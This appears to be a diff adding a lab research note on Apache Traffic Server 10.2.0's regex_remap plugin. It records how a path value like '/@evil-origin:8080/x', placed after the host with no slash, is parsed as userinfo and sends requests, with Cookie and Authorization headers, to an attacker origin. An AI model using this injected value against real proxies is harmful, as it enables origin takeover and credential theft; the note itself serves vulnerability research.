@@ -1,0 +1,20 @@
+G3 regex_remap $n userinfo origin takeover
+Pin: Apache Traffic Server 10.2.0 b1df7334b39a878971c376da849e8da4984918b6
+
+CONTROL GET /ok Host lab-slash.example -> GOOD from good-origin, no witness.
+
+Tried in order:
+1. subst http://good-origin:8080/$1  path /@evil-origin:8080/x
+   dest http://good-origin:8080/@evil-origin:8080/x
+   stayed on good-origin. Documented slash-after-host shape is not userinfo
+   because URL.cc treats / as the authority terminator.
+2. subst http://good-origin:8080$1  path /@evil-origin:8080/x
+   dest http://good-origin:8080@evil-origin:8080/x
+   URL.cc @ branch: userinfo=good-origin:8080 host=evil-origin:8080
+   returned ATS-REGEX-REMAP-USERINFO-WITNESS. Cookie and Authorization
+   forwarded as ATS uid. This is the leftover.
+3. subst http://$1 also reached evil-origin (operator put $n in authority).
+
+Leftover is $n immediately after the host with no slash
+(http://origin:port$1), not the documented http://origin/$1 path capture.
+remap_required stayed 1. regex_remap.so is not loaded by default.
